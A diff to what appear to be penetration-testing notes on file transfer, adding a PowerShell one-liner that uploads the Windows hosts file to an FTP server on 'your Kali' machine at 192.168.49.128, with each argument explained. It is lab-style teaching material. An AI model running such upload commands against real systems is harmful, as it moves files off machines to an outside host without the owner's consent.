@@ -312,3 +312,9 @@ sudo python3 -m pyftpdlib --port 21 --write
 - `--write` allows clients to upload files
 
 #### Upload a file using Powershell
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+- `ftp://192.168.49.128/ftp-hosts`: Destination on your Kali FTP server. The uploaded file will be named `ftp-hosts`.
+- `C:\Windows\System32\drivers\etc\hosts`: Local Windows file being uploaded.
